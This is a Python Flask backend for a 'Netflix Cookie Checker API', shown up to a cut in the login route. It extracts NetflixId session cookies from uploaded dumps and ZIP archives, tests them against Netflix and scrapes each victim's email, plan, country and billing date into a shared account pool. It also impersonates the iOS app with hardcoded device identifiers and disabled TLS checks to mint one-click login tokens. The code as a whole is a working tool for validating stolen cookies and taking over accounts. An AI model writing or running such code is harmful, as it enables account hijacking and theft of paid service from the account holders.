from flask import Flask, request, jsonify, send_from_directory, make_response, stream_with_context, Response, g
from flask_cors import CORS, cross_origin
from functools import wraps
import os
import io
import re
import json
import requests
import zipfile
import urllib.parse
import urllib3
from urllib3.exceptions import InsecureRequestWarning
import logging
import tempfile
import shutil
import uuid
import hashlib
import time
from datetime import datetime, timedelta, timezone
from supabase import create_client, Client
from gotrue.errors import AuthApiError
from dotenv import load_dotenv
from deep_translator import GoogleTranslator
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_talisman import Talisman
import secrets
from marshmallow import Schema, fields, validate, ValidationError
from bs4 import BeautifulSoup
import random
import string

load_dotenv()
urllib3.disable_warnings(InsecureRequestWarning)

app = Flask(__name__)
app.secret_key = os.environ.get('FLASK_SECRET_KEY') or secrets.token_hex(32)

# Vercel-compatible limiter (memory storage acceptable for serverless)
limiter = Limiter(app=app, key_func=get_remote_address, default_limits=[])

app.config['SESSION_TYPE'] = 'filesystem'
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=24)
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'

# Production-ready Talisman
Talisman(app, 
    force_https=False,
    strict_transport_security=True,
    content_security_policy={
        'default-src': "'self'",
        'script-src': "'self'",
        'style-src': "'self' 'unsafe-inline'"
    }
)

# Fixed CORS - removed wildcard with credentials
ALLOWED_ORIGINS = [
    "http://localhost:3000",
    "http://localhost:5000",
    "http://localhost:8080",
    "https://hakdowken.vercel.app",
    "https://nftoken.vonezis.me"
]

CORS(app, resources={
    r"/api/*": {
        "origins": ALLOWED_ORIGINS,
        "methods": ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
        "allow_headers": ["Content-Type", "Authorization", "X-Requested-With", "Accept", "Origin"],
        "supports_credentials": True,
        "max_age": 86400
    }
})

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Vercel temp directory
TEMP_DIR = "/tmp"

# Supabase configuration
SUPABASE_URL = os.environ.get('SUPABASE_URL', 'your-supabase-url')
SUPABASE_SERVICE_KEY = os.environ.get('SUPABASE_SERVICE_KEY', 'your-service-role-key')
SUPABASE_ANON_KEY = os.environ.get('SUPABASE_ANON_KEY', 'your-anon-key')
SUPER_ADMIN_EMAILS = os.environ.get('SUPER_ADMIN_EMAILS', '').split(',')
SUPER_ADMIN_IDS = os.environ.get('SUPER_ADMIN_IDS', '').split(',')

required_env = ['SUPABASE_URL', 'SUPABASE_SERVICE_KEY', 'SUPABASE_ANON_KEY']
missing = [var for var in required_env if not os.environ.get(var)]
if missing:
    logger.warning(f"Missing environment variables: {missing}")

supabase: Client = create_client(SUPABASE_URL, SUPABASE_SERVICE_KEY)

translator = GoogleTranslator(source='auto', target='en')

# Validation Schema
class CookieCheckSchema(Schema):
    content = fields.String(required=True)
    mode = fields.String(validate=validate.OneOf(['check_only', 'generate_token']), 
                        missing='check_only')

# =============================================================================
# ALL HELPER FUNCTIONS AND DECORATORS (DEFINED BEFORE USE)
# =============================================================================
def decode_unicode(text):
    """Decode unicode escapes like \x40 → @ and percent encoding"""
    if not text or not isinstance(text, str):
        return text
    try:
        decoded = text.encode('utf-8').decode('unicode-escape')
        decoded = urllib.parse.unquote(decoded)
        return decoded
    except:
        return text


def parse_next_billing_date(date_str):
    """Parse Netflix next billing date and return (formatted_str, days_left)"""
    if not date_str or date_str == "Unknown":
        return None, None

    date_str = date_str.strip()
    formats = [
        "%B %d, %Y", "%d %B %Y", "%Y-%m-%d", "%Y-%m-%dT%H:%M:%S", "%B %d"
    ]

    parsed_date = None
    for fmt in formats:
        try:
            if fmt == "%B %d" and len(date_str.split()) == 2:
                year = datetime.now().year
                parsed_date = datetime.strptime(f"{date_str} {year}", "%B %d %Y")
            else:
                parsed_date = datetime.strptime(date_str, fmt)
            break
        except:
            continue

    if not parsed_date:
        try:
            from dateutil import parser
            parsed_date = parser.parse(date_str, fuzzy=True)
        except:
            return date_str, None

    if parsed_date.tzinfo is None:
        parsed_date = parsed_date.replace(tzinfo=timezone.utc)

    today = datetime.now(timezone.utc)
    days_left = (parsed_date - today).days

    return date_str, days_left


def is_super_admin(user_id):
    if not user_id:
        return False
    if str(user_id) in SUPER_ADMIN_IDS:
        return True
    try:
        result = supabase.table('user_profiles')\
            .select('is_super_admin, role')\
            .eq('id', str(user_id)).single().execute()
        if result.data:
            return result.data.get('is_super_admin') or result.data.get('role') == 'super_admin'
    except Exception as e:
        logger.error(f"Super admin check error: {e}")
    return False

class CookieCheckSchema(Schema):
    content = fields.String(required=True)
    mode = fields.String(validate=validate.OneOf(['check_only', 'generate_token']), missing='check_only')


def validate_input(data):
    schema = CookieCheckSchema()
    try:
        return schema.load(data), None
    except ValidationError as err:
        return None, err.messages


def require_auth(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        auth_header = request.headers.get('Authorization')
        if not auth_header or not auth_header.startswith('Bearer '):
            return jsonify({'status': 'error', 'message': 'Authentication required'}), 401

        token = auth_header.split(' ')[1]
        try:
            user_response = supabase.auth.get_user(token)
            if not user_response or not user_response.user:
                return jsonify({'status': 'error', 'message': 'Invalid token'}), 401
            g.user = user_response.user
            g.token = token
            return f(user_response.user, *args, **kwargs)
        except Exception as e:
            logger.error(f"Auth error: {e}")
            return jsonify({'status': 'error', 'message': 'Invalid or expired token'}), 401
    return decorated_function


def require_super_admin(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth_header = request.headers.get('Authorization')
        if not auth_header or not auth_header.startswith('Bearer '):
            return jsonify({'status': 'error', 'message': 'Authentication required'}), 401
        token = auth_header.split(' ')[1]
        try:
            user_resp = supabase.auth.get_user(token)
            if not user_resp or not is_super_admin(user_resp.user.id):
                return jsonify({'status': 'error', 'message': 'Super admin required'}), 403
            return f(user_resp.user, *args, **kwargs)
        except Exception as e:
            logger.error(f"Super admin error: {e}")
            return jsonify({'status': 'error', 'message': 'Invalid token'}), 401
    return decorated

def get_accounts_query(user_id, is_premium=False, is_admin=False):
    """Build query based on user permissions"""
    if is_admin:
        return supabase.table('netflix_accounts').select('*')
    
    return supabase.table('netflix_accounts')\
        .select('*')\
        .eq('is_active', True)\
        .eq('is_premium', True)\
        .or_('exclusive_access.eq.false,reserved_for_super_admin.eq.false')

def ensure_ph_accounts_pool():
    """Ensure at least 8 PH premium accounts exist for super admin"""
    try:
        result = supabase.table('netflix_accounts')\
            .select('*', count='exact')\
            .eq('country', 'PH')\
            .eq('is_premium', True)\
            .eq('is_active', True)\
            .execute()
        
        current_count = result.count if hasattr(result, 'count') else len(result.data or [])
        
        if current_count < 8:
            logger.warning(f"PH accounts pool low: {current_count}/8. Super admin should add more.")
        
        return current_count
    except Exception as e:
        logger.error(f"Error checking PH accounts pool: {e}")
        return 0

def check_premium_status(user_id):
    try:
        result = supabase.table('user_profiles')\
            .select('is_premium').eq('id', user_id).single().execute()
        return result.data.get('is_premium', False) if result.data else False
    except Exception as e:
        logger.error(f"Error checking premium status: {e}")
        return False

def decode_unicode(text):
    if not text or not isinstance(text, str):
        return text
    try:
        return text.encode('utf-8').decode('unicode-escape')
    except:
        return text

def translate_plan_name(plan_name):
    if not plan_name or plan_name == "Unknown":
        return "Unknown"
    
    decoded = decode_unicode(plan_name)
    cleaned = decoded.strip().lower()
    cleaned_no_spaces = cleaned.replace(' ', '').replace('-', '').replace('_', '')
    
    PLAN_TRANSLATIONS = {
        'พรีเมียม': 'Premium', 'สแตนดาร์ด': 'Standard', 'เบสิก': 'Basic', 'โมบาย': 'Mobile',
        'โฆษณา': 'Standard with Ads', 'premium': 'Premium', 'estándar': 'Standard',
        'básico': 'Basic', 'básica': 'Basic', 'móvil': 'Mobile', 'con anuncios': 'Standard with Ads',
        'padrão': 'Standard', 'com anúncios': 'Standard with Ads', 'prêmio': 'Premium',
        'essentiel': 'Basic', 'avec publicité': 'Standard with Ads', 'sans publicité': 'Standard',
        'basis': 'Basic', 'werbefrei': 'Standard', 'base': 'Basic', 'standaard': 'Standard',
        'プレミアム': 'Premium', 'スタンダード': 'Standard', 'ベーシック': 'Basic', '広告付き': 'Standard with Ads',
        '프리미엄': 'Premium', '스탠다드': 'Standard', '베이직': 'Basic', '광고 포함': 'Standard with Ads',
        '高级': 'Premium', '标准': 'Standard', '基础': 'Basic', '含广告': 'Standard with Ads', '无广告': 'Standard',
        'премиум': 'Premium', 'стандарт': 'Standard', 'базовый': 'Basic', 'с рекламой': 'Standard with Ads',
        'بريميوم': 'Premium', 'ستاندرد': 'Standard', 'أساسي': 'Basic', 'مع إعلانات': 'Standard with Ads',
        'temel': 'Basic', 'standart': 'Standard', 'reklamlı': 'Standard with Ads',
        'podstawowy': 'Basic', 'z reklamami': 'Standard with Ads',
        'standar': 'Standard', 'dasar': 'Basic', 'dengan iklan': 'Standard with Ads',
        'cao cấp': 'Premium', 'tiêu chuẩn': 'Standard', 'cơ bản': 'Basic', 'có quảng cáo': 'Standard with Ads',
    }
    
    if cleaned in PLAN_TRANSLATIONS:
        return PLAN_TRANSLATIONS[cleaned]
    
    if any(keyword in cleaned or keyword in cleaned_no_spaces for keyword in 
           ['premium', 'uhd', 'ultra', '4k', 'hdr', 'พรีเมียม', '프리미엄', 'プレミアム', '高级', 'премиум', 'بريميوم', 'cao', 'prêmio']):
        return 'Premium'
    
    if any(keyword in cleaned or keyword in cleaned_no_spaces for keyword in 
           ['standard', 'standaard', 'estándar', 'padrão', 'スタンダード', '스탠다드', '标准', 'สแตนดาร์ด', 'standart', 'tiêu']):
        return 'Standard'
    
    if any(keyword in cleaned or keyword in cleaned_no_spaces for keyword in 
           ['basic', 'basis', 'básico', 'básica', 'ベーシック', '基础', 'เบสิก', 'essentiel', 'базовый', 'أساسي', 'temel', 'podstawowy', 'dasar', 'cơ', 'base']):
        return 'Basic'
    
    if any(keyword in cleaned or keyword in cleaned_no_spaces for keyword in 
           ['mobile', 'móvil', 'móvel', 'โมบาย']):
        return 'Mobile'
    
    if any(keyword in cleaned for keyword in 
           ['ads', 'ad', 'anuncios', 'anúncios', 'publicidad', 'werbung', 'reklam', 'iklan', 'quảng cáo', 'إعلانات', 'реклама', '広告']):
        return 'Standard with Ads'
    
    return decoded.title()

def extract_netflix_id(content):
    try:
        data = json.loads(content)
        if isinstance(data, list):
            for cookie in data:
                if cookie.get("name") == "NetflixId":
                    return cookie.get("value")
        elif isinstance(data, dict):
            if "NetflixId" in data:
                return data["NetflixId"]
            elif "cookies" in data:
                for cookie in data["cookies"]:
                    if cookie.get("name") == "NetflixId":
                        return cookie.get("value")
    except:
        pass
    
    netflix_id_match = re.search(r'(?<!\w)NetflixId=([^;,\s]+)', content)
    if netflix_id_match:
        netflix_id = netflix_id_match.group(1)
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return netflix_id
    
    netscape_match = re.search(r'\.netflix\.com\s+TRUE\s+/\s+TRUE\s+\d+\s+NetflixId\s+([^\s]+)', content)
    if netscape_match:
        netflix_id = netscape_match.group(1)
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return netflix_id
    
    plain_match = re.search(r'NetflixId[=:\s]+([^\s;,\n]+)', content, re.IGNORECASE)
    if plain_match:
        netflix_id = plain_match.group(1)
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return netflix_id
    
    return None

def check_netflix_cookie(cookie_dict):
    session = requests.Session()
    session.cookies.update(cookie_dict)

    url = 'https://www.netflix.com/YourAccount'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
    }

    try:
        resp = session.get(url, headers=headers, timeout=30)
        txt = resp.text
        txt_lower = txt.lower()

        # Check 1: Redirected to login page = invalid cookie
        if '"mode":"login"' in txt_lower:
            return {'ok': False, 'err': 'Invalid cookie'}

        # Check 2: Not on account page = not logged in
        if '"mode":"yourAccount"' not in txt:
            # Additional check: is it a payment/billing issue?
            if 'payment' in txt_lower or 'billing' in txt_lower or 'update your payment' in txt_lower:
                return {'ok': False, 'err': 'Payment required'}
            if 'membership has been canceled' in txt_lower or 'canceled' in txt_lower:
                return {'ok': False, 'err': 'Membership canceled'}
            if 'restart' in txt_lower and 'membership' in txt_lower:
                return {'ok': False, 'err': 'Membership expired - restart required'}
            if 'unauthorized' in txt_lower or 'session expired' in txt_lower:
                return {'ok': False, 'err': 'Session expired'}
            return {'ok': False, 'err': 'Not logged in'}

        # Check 3: Account page loaded but check for specific expired states
        if 'your membership is on hold' in txt_lower or 'on hold' in txt_lower:
            return {'ok': False, 'err': 'Membership on hold'}
        
        if 'please update your payment method' in txt_lower or 'payment method' in txt_lower:
            return {'ok': False, 'err': 'Payment method required'}

        def find(pattern, flags=0):
            m = re.search(pattern, txt, flags)
            return m.group(1).strip() if m else "Unknown"

        # Plan
        raw_plan = find(r'"planName"\s*:\s*"([^"]+)"')
        if raw_plan == "Unknown":
            raw_plan = find(r'localizedPlanName[^}]+"value":"([^"]+)"')
        if raw_plan == "Unknown":
            raw_plan = find(r'"currentPlanName"\s*:\s*"([^"]+)"')
        if raw_plan == "Unknown":
            raw_plan = find(r'"plan"\s*:\s*"([^"]+)"')

        # Next Billing Date (Improved)
        next_billing_raw = find(r'"nextBillingDate"\s*:\s*"([^"]+)"')
        if next_billing_raw == "Unknown":
            next_billing_raw = find(r'data-uia="nextBillingDate-item"[^>]*>([^<]+)<')
        if next_billing_raw == "Unknown":
            next_billing_raw = find(r'Next billing date[^:]*[:]\s*([^<"]+)', re.I)
        if next_billing_raw == "Unknown":
            next_billing_raw = find(r'next payment[^:]*[:]\s*([^<"]+)', re.I)

        next_billing_str, days_left = parse_next_billing_date(next_billing_raw)

        # Check 4: Billing expired
        is_expired = False
        if days_left is not None and days_left < -3:
            is_expired = True

        # Check 5: Membership status
        status_match = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
        is_valid = bool(status_match)
        is_premium = is_valid and status_match.group(1) == 'CURRENT_MEMBER'
        
        # Check 6: If membershipStatus is not CURRENT_MEMBER, it's invalid
        if status_match and status_match.group(1) != 'CURRENT_MEMBER':
            status = status_match.group(1)
            if status == 'CANCELLED':
                return {'ok': False, 'err': 'Membership cancelled'}
            elif status == 'INACTIVE':
                return {'ok': False, 'err': 'Membership inactive'}
            elif status == 'HOLD':
                return {'ok': False, 'err': 'Membership on hold'}
            else:
                return {'ok': False, 'err': f'Membership status: {status}'}

        # Check 7: If no membership status found at all, likely not a valid member
        if not is_valid:
            return {'ok': False, 'err': 'No membership status found'}

        plan = translate_plan_name(raw_plan)

        signup_country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"')
        current_country = find(r'"currentCountry"\s*:\s*"([^"]+)"')
        membership_country = find(r'"country"\s*:\s*"([^"]+)"')
        
        locale = find(r'"locale"\s*:\s*"([^"]+)"')
        locale_country = locale.split('_')[0].upper() if locale and '_' in locale else None
        if not locale_country and locale and len(locale) == 2:
            locale_country = locale.upper()
        
        currency = find(r'"currency"\s*:\s*"([^"]+)"')
        currency_map = {
            'PHP': 'PH', 'USD': 'US', 'EUR': 'EU', 'GBP': 'GB', 'JPY': 'JP',
            'KRW': 'KR', 'THB': 'TH', 'IDR': 'ID', 'MYR': 'MY', 'SGD': 'SG',
            'AUD': 'AU', 'CAD': 'CA', 'MXN': 'MX', 'BRL': 'BR', 'ARS': 'AR',
            'CLP': 'CL', 'COP': 'CO', 'PEN': 'PE', 'CHF': 'CH', 'SEK': 'SE',
            'NOK': 'NO', 'DKK': 'DK', 'PLN': 'PL', 'CZK': 'CZ', 'HUF': 'HU',
            'RON': 'RO', 'BGN': 'BG', 'HRK': 'HR', 'TRY': 'TR', 'ILS': 'IL',
            'AED': 'AE', 'SAR': 'SA', 'ZAR': 'ZA', 'INR': 'IN', 'PKR': 'PK',
            'BDT': 'BD', 'LKR': 'LK', 'NPR': 'NP', 'MMK': 'MM', 'VND': 'VN',
            'TWD': 'TW', 'HKD': 'HK', 'CNY': 'CN', 'RUB': 'RU', 'UAH': 'UA',
            'KZT': 'KZ', 'EGP': 'EG', 'NGN': 'NG', 'KES': 'KE', 'GHS': 'GH'
        }
        currency_country = currency_map.get(currency, None)
        
        detected_country = None
        
        if '"es-ES"' in txt or 'es_ES' in txt or 'España' in txt:
            detected_country = 'ES'
        elif '"es-' in txt or 'espanol' in txt_lower or 'español' in txt_lower:
            detected_country = 'MX'
        elif '"pt-BR"' in txt or 'pt_BR' in txt or 'Brasil' in txt:
            detected_country = 'BR'
        elif '"pt-' in txt or 'portugues' in txt_lower:
            detected_country = 'PT'
        elif '"fr-FR"' in txt or 'fr_FR' in txt:
            detected_country = 'FR'
        elif '"fr-' in txt or 'francais' in txt_lower:
            detected_country = 'CA'
        elif '"de-DE"' in txt or 'de_DE' in txt:
            detected_country = 'DE'
        elif '"de-' in txt or 'deutsch' in txt_lower:
            detected_country = 'AT'
        elif '"it-IT"' in txt or 'it_IT' in txt:
            detected_country = 'IT'
        elif '"ja-JP"' in txt or 'ja_JP' in txt or '日本' in txt:
            detected_country = 'JP'
        elif '"ko-KR"' in txt or 'ko_KR' in txt or '한국' in txt:
            detected_country = 'KR'
        elif '"th-TH"' in txt or 'th_TH' in txt or 'ไทย' in txt:
            detected_country = 'TH'
        elif '"ph-PH"' in txt or 'ph_PH' in txt or 'Pilipinas' in txt:
            detected_country = 'PH'
        elif '"id-ID"' in txt or 'id_ID' in txt or 'Indonesia' in txt:
            detected_country = 'ID'
        elif '"vi-VN"' in txt or 'vi_VN' in txt or 'Việt Nam' in txt:
            detected_country = 'VN'
        elif '"ms-MY"' in txt or 'ms_MY' in txt or 'Malaysia' in txt:
            detected_country = 'MY'
        elif '"zh-TW"' in txt or 'zh_TW' in txt or '台灣' in txt:
            detected_country = 'TW'
        elif '"zh-HK"' in txt or 'zh_HK' in txt or '香港' in txt:
            detected_country = 'HK'
        elif '"zh-CN"' in txt or 'zh_CN' in txt or '中国' in txt:
            detected_country = 'CN'
        elif '"tr-TR"' in txt or 'tr_TR' in txt or 'Türkiye' in txt:
            detected_country = 'TR'
        elif '"ar-' in txt or 'العربية' in txt:
            detected_country = 'SA'
        elif '"pl-PL"' in txt or 'pl_PL' in txt:
            detected_country = 'PL'
        elif '"nl-NL"' in txt or 'nl_NL' in txt:
            detected_country = 'NL'
        elif '"sv-SE"' in txt or 'sv_SE' in txt:
            detected_country = 'SE'
        elif '"en-GB"' in txt or 'en_GB' in txt:
            detected_country = 'GB'
        elif '"en-US"' in txt or 'en_US' in txt:
            detected_country = 'US'
        elif '"en-' in txt:
            detected_country = 'US'
        
        country = (
            current_country if current_country != "Unknown" else
            detected_country if detected_country else
            membership_country if membership_country != "Unknown" else
            signup_country if signup_country != "Unknown" else
            locale_country if locale_country else
            currency_country if currency_country else
            "Unknown"
        )

        email = find(r'"emailAddress"\s*:\s*"([^"]+)"')
        if email != "Unknown":
            email = urllib.parse.unquote(email)

        subscription_type = "Standard"
        plan_lower = plan.lower()

        if "premium" in plan_lower:
            subscription_type = "Premium"
        elif "standard" in plan_lower:
            subscription_type = "Standard"
        elif "basic" in plan_lower:
            subscription_type = "Basic"
        elif "mobile" in plan_lower:
            subscription_type = "Mobile"
        
        if plan == "Unknown" and is_premium:
            if any(indicator in txt_lower for indicator in ['"isuhdavailable":true', '"uhd":true', '"hdr":true', '"4k":true']):
                plan = "Premium (UHD)"
                subscription_type = "Premium"
            elif '"maxstreams":4' in txt_lower:
                plan = "Premium (4 screens)"
                subscription_type = "Premium"
            elif '"maxstreams":2' in txt_lower:
                plan = "Standard (2 screens)"
                subscription_type = "Standard"

        return {
            'ok': is_valid and is_premium and not is_expired,
            'premium': is_premium,
            'email': email,
            'country': country,
            'signup_country': signup_country if signup_country != "Unknown" else country,
            'plan': plan,
            'subscription_type': subscription_type,
            'detection_method': (
                'current_ip' if current_country != "Unknown" else
                'content_language' if detected_country else
                'membership' if membership_country != "Unknown" else
                'signup' if signup_country != "Unknown" else
                'locale' if locale_country else
                'currency' if currency_country else
                'unknown'
            ),
            'next_billing_date': next_billing_str,
            'days_until_billing': days_left,
            'is_expired': is_expired
        }
        
    except Exception as e:
        logger.error(f"Error checking cookie: {str(e)}")
        return {'ok': False, 'err': str(e)}

def generate_token(netflix_id):
    url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
    
    params = {
        'appVersion': "15.48.1",
        'config': '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
        'device_type': "NFAPPL-02-",
        'esn': "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        'idiom': "phone",
        'iosVersion': "15.8.5",
        'isTablet': "false",
        'languages': "en-US",
        'locale': "en-US",
        'maxDeviceWidth': "375",
        'model': "saget",
        'modelType': "IPHONE8-1",
        'odpAware': "true",
        'path': '["account","token","default"]',
        'pathFormat': "graph",
        'pixelDensity': "2.0",
        'progressive': "false",
        'responseFormat': "json"
    }

    headers = {
        'User-Agent': "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
        'x-netflix.request.attempt': "1",
        'x-netflix.request.client.user.guid': "A4CS633D7VCBPE2GPK2HL4EKOE",
        'x-netflix.context.profile-guid': "A4CS633D7VCBPE2GPK2HL4EKOE",
        'x-netflix.request.routing': '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
        'x-netflix.context.app-version': "15.48.1",
        'x-netflix.argo.translated': "true",
        'x-netflix.context.form-factor': "phone",
        'x-netflix.context.sdk-version': "2012.4",
        'x-netflix.client.appversion': "15.48.1",
        'x-netflix.context.max-device-width': "375",
        'x-netflix.context.ab-tests': "",
        'x-netflix.tracing.cl.useractionid': "4DC655F2-9C3C-4343-8229-CA1B003C3053",
        'x-netflix.client.type': "argo",
        'x-netflix.client.ftl.esn': "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        'x-netflix.context.locales': "en-US",
        'x-netflix.context.top-level-uuid': "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        'x-netflix.client.iosversion': "15.8.5",
        'accept-language': "en-US;q=1",
        'x-netflix.argo.abtests': "",
        'x-netflix.context.os-version': "15.8.5",
        'x-netflix.request.client.context': '{"appState":"foreground"}',
        'x-netflix.context.ui-flavor': "argo",
        'x-netflix.argo.nfnsm': "9",
        'x-netflix.context.pixel-density': "2.0",
        'x-netflix.request.toplevel.uuid': "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        'x-netflix.request.client.timezoneid': "Asia/Dhaka",
        'Cookie': f"NetflixId={netflix_id}"
    }

    try:
        response = requests.get(url, params=params, headers=headers, timeout=30, verify=False)
        data = response.json()
        
        if "value" in data and data["value"] and "account" in data["value"]:
            token_data = data["value"]["account"]["token"]["default"]
            token = token_data["token"]
            expires = token_data["expires"]
            
            if len(str(expires)) == 13:
                expires //= 1000
            
            login_urls = {
                "phone": f"https://netflix.com/unsupported?nftoken={token}",
                "tv": f"https://netflix.com/tv8?nftoken={token}",
                "pc": f"https://netflix.com/browse?nftoken={token}"
            }
            
            return {
                "status": "Success",
                "token": token,
                "expires": expires,
                "login_urls": login_urls
            }
        return {"status": "Failure", "error": "No token"}
    except Exception as e:
        return {"status": "Error", "error": str(e)}

def extract_zip_and_get_files(zip_path, extract_dir):
    txt_files = []
    try:
        extract_dir = os.path.join(TEMP_DIR, os.path.basename(extract_dir))
        os.makedirs(extract_dir, exist_ok=True)
        
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(extract_dir)
        for root, dirs, files in os.walk(extract_dir):
            for file in files:
                if file.lower().endswith('.txt'):
                    txt_files.append(os.path.join(root, file))
        return txt_files
    except Exception as e:
        logger.error(f"Error extracting ZIP: {e}")
        return []

def store_netflix_account(email, netflix_id, subscription_type, country, plan,
                         cookie_content, user_id, signup_country=None,
                         detection_method=None, is_exclusive=False,
                         reserved_for_admin=False, next_billing_date=None,
                         days_until_billing=None, is_expired=False):
    """Store account with billing info"""
    try:
        clean_email = decode_unicode(email)

        # Skip clearly expired accounts
        if is_expired and days_until_billing is not None and days_until_billing < -5:
            logger.warning(f"Skipping expired account: {clean_email} ({days_until_billing} days)")
            return False, None

        adding_user_is_admin = is_super_admin(user_id)

        account_data = {
            'email': clean_email,
            'netflix_id': netflix_id,
            'subscription_type': subscription_type,
            'country': country,
            'signup_country': signup_country or country,
            'plan': plan,
            'is_premium': True,
            'cookie_data': cookie_content[:500] if cookie_content else None,
            'added_by': str(user_id),
            'last_checked': datetime.utcnow().isoformat(),
            'is_active': True,
            'detection_method': detection_method,
            'exclusive_access': is_exclusive if adding_user_is_admin else False,
            'reserved_for_super_admin': reserved_for_admin if adding_user_is_admin else False,
            'next_billing_date': next_billing_date,
            'days_until_billing': days_until_billing,
            'is_expired': is_expired
        }

        headers = {
            'apikey': SUPABASE_SERVICE_KEY,
            'Authorization': f'Bearer {SUPABASE_SERVICE_KEY}',
            'Content-Type': 'application/json',
            'Prefer': 'return=representation,resolution=merge-duplicates'
        }

        check_url = f"{SUPABASE_URL}/rest/v1/netflix_accounts?select=id&email=eq.{urllib.parse.quote(clean_email)}"
        check_resp = requests.get(check_url, headers=headers, timeout=30)

        if check_resp.status_code == 200 and check_resp.json():
            account_id = check_resp.json()[0]['id']
            update_url = f"{SUPABASE_URL}/rest/v1/netflix_accounts?id=eq.{account_id}"
            result = requests.patch(update_url, headers=headers, json=account_data, timeout=30)
            if result.status_code in [200, 204]:
                fetch = requests.get(f"{SUPABASE_URL}/rest/v1/netflix_accounts?id=eq.{account_id}", headers=headers)
                return True, fetch.json()[0] if fetch.status_code == 200 else None
        else:
            insert_url = f"{SUPABASE_URL}/rest/v1/netflix_accounts"
            result = requests.post(insert_url, headers=headers, json=account_data, timeout=30)
            if result.status_code == 201:
                return True, result.json()[0] if result.json() else None

        return False, None

    except Exception as e:
        logger.error(f"Error storing account: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return False, None

def log_token_generation(account_id, user_id, ip_address, token=None):
    try:
        headers = {
            'apikey': SUPABASE_SERVICE_KEY,
            'Authorization': f'Bearer {SUPABASE_SERVICE_KEY}',
            'Content-Type': 'application/json',
            'Prefer': 'return=representation'
        }
        
        log_data = {
            'account_id': str(account_id),
            'generated_by': str(user_id),
            'ip_address': str(ip_address) if ip_address else None
        }
        
        if token:
            log_data['token_hash'] = hashlib.sha256(token.encode()).hexdigest()[:32]
            log_data['token'] = token[:100]
        
        url = f"{SUPABASE_URL}/rest/v1/token_logs"
        resp = requests.post(url, headers=headers, json=log_data)
        
        if resp.status_code == 201:
            logger.info(f"Token log SUCCESS")
            return True
        else:
            logger.error(f"Token log FAILED: {resp.status_code} - {resp.text}")
            return False
        
    except Exception as e:
        logger.error(f"Token log FAILED: {str(e)}")
        import traceback
        logger.error(traceback.format_exc())
        return False

# =============================================================================
# ROUTES START HERE
# =============================================================================

@app.after_request
def security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    return response

@app.route('/')
def home():
    return jsonify({"status": "ok", "message": "Netflix Cookie Checker API running"})

# @app.route('/')
# def serve_index():
#     return jsonify({
#         "status": "ok",
#         "message": "Netflix Cookie Checker API is running",
#         "endpoints": {
#             "test": "/api/test",
#             "signup": "/api/auth/signup",
#             "login": "/api/auth/login",
#             "check": "/api/check",
#             "accounts": "/api/accounts"
#         }
#     })

@app.route('/api/auth/signup', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
def signup():
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add('Access-Control-Max-Age', '86400')
        return response, 204
        
    try:
        data = request.get_json()
        email = data.get('email')
        password = data.get('password')
        
        if not email or not password:
            return jsonify({'status': 'error', 'message': 'Email and password required'})
        
        auth_response = supabase.auth.sign_up({
            "email": email,
            "password": password
        })
        
        return jsonify({
            'status': 'success',
            'message': 'User created successfully',
            'user': {
                'id': auth_response.user.id,
                'email': auth_response.user.email
            }
        })
    except AuthApiError as e:
        return jsonify({'status': 'error', 'message': str(e)})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/api/test', methods=['GET', 'OPTIONS'])
def test():
    return jsonify({"status": "ok", "message": "API is working!"})

@app.route('/api/auth/login', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
def login():
